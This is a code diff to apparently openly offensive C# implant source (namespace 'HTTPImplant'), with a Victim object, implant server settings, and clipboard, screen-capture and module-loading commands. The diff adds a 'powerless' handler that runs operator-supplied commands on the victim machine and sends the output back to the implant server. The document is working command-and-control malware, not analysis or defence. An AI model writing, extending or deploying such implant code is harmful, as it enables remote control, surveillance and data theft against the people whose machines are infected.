@@ -43,13 +43,15 @@ namespace HTTPImplant
     {
         public static Victim victim = new Victim();
         public static string host = "localhost";  // Host of the implant server
-        public static string port = "8083"; // Port of the implant server
+        public static string port = "8081"; // Port of the implant server
         private static string lastCommandExecuted = string.Empty; // Store the last command that was executed
         public static bool SMB = false;
         private static bool usesmb;
 
         public static void Main(string[] args)
         {
+            /*Powerless.Exec("whoami");
+            Environment.Exit(0);*/
             /*ClipboardFetcher.GetData();
             Environment.Exit(0);*/
             /*ScreenGrab.CaptureScreen();
@@ -167,6 +169,14 @@ namespace HTTPImplant
                                 {
                                     Console.WriteLine("Running screen fetcher... ");
                                     string output = ScreenGrab.CaptureScreen();
+                                    await SendResult(webClient, implantId, command.Operator, output, SMB);
+                                }
+                                else if (command.Input.Trim().Equals("powerless", StringComparison.OrdinalIgnoreCase))
+                                {
+                                    Console.WriteLine("Running powerless command: " + command.command);
+                                    string output = Powerless.Exec(command.command);
+                                    string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
+                                    Console.WriteLine(outputBase64);
                                     await SendResult(webClient, implantId, command.Operator, output, SMB);
                                 }
                                 else if (command.Input.Trim().Equals("loadcs", StringComparison.OrdinalIgnoreCase))
